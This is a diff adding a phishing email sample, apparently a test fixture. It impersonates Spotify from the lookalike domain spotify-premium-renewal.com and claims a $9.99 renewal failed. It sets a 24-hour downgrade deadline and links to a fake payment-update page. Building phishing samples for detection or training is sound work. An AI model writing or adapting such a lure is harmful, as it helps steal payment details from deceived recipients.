@@ -1,0 +1,14 @@
+From: "Spotify" <billing@spotify-premium-renewal.com>
+To: user@gmail.com
+Subject: Your Spotify Premium subscription renewal failed
+Date: Mon, 08 Sep 2025 11:22:33 +0000
+Message-ID: <spotify-renew-112233@spotify-premium-renewal.com>
+Content-Type: text/html; charset="UTF-8"
+
+<html><body style="font-family:Arial"><div style="max-width:500px;margin:0 auto;background:white;border:1px solid #ddd">
+<div style="background:#1db954;color:white;padding:15px;text-align:center"><h2 style="margin:0">Spotify</h2></div>
+<div style="padding:20px">
+<p>Hi User,</p>
+<p>Your Spotify Premium subscription payment of <strong>$9.99</strong> failed. Your account will revert to free tier in 24 hours unless you update your payment method.</p>
+<p style="text-align:center"><a href="https://spotify-premium-renewal.com/update?id=112233" style="background:#1db954;color:white;padding:10px 20px;text-decoration:none">Update Payment</a></p>
+</div></div></body></html>
